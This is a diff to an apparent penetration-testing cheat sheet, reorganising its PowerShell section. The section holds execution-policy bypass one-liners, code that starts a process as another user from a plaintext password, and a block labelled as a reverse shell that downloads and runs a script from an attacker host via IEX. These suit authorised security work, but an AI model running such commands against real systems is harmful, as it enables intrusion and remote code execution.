@@ -1031,10 +1031,6 @@ PROMPT="%F{white,bold}%W %* $(ip a | grep -A 1 eth0 | grep inet | awk '{ print $
 
 ### PowerShell
 
-```c
-PS C:\> type <FILE> | findstr /l <STRING>
-```
-
 For `PowerShell` paste it into the open terminal.
 
 ```c
@@ -1272,16 +1268,30 @@ $ sudo apt-get install powershell
 
 ### General Usage
 
+#### Search for Files
+
+```c
+PS C:\> type <FILE> | findstr /l <STRING>
+```
+
+#### Check Execution Policy
+
+```c
+PS C:\> Get-ExecutionPolicy
+```
+
 #### Allow Script Execution
 
 ```c
-PS C:\> set-executionpolicy remotesigned
+PS C:\> Set-executionpolicy remotesigned
 PS C:\> Set-ExecutionPolicy unrestricted
+PS C:\> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
 ```
 
 ### Script Execution Bypass
 
 ```c
+PS C:\> powershell -ex bypass -File <FILE>.ps1
 PS C:\> powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
 ```
 
@@ -1299,6 +1309,13 @@ PS C:\> powershell -Command "$PSVersionTable.PSVersion"
 PS C:\> powershell -c "[Environment]::Is64BitProcess"
 ```
 
+### PSCredential
+
+```c
+Import-CliXml
+Export-CliXml
+```
+
 ### Start offsec Session
 
 ```c
@@ -1306,11 +1323,14 @@ PS /home/kali> $offsec_session = New-PSSession -ComputerName <RHOST> -Authentica
 PS /home/kali> Enter-PSSession $offsec_session
 ```
 
-### PSCredential
+### Execute Command as another User
 
 ```c
-Import-CliXml
-Export-CliXml
+PS C:\> $username = '<USERNAME>'
+PS C:\> $password = '<PASSWORD>'
+PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+PS C:\> Start-Process powershell.exe -Credential $credential
 ```
 
 ```c
@@ -1426,9 +1446,9 @@ PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage
 #### Execute Scripts with Credentials (Reverse Shell)
 
 ```c
-PS C:\>  $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
-PS C:\>  $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
-PS C:\>  Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
+PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
+PS C:\> $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
+PS C:\> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
 ```
 
 #### New-PSSession
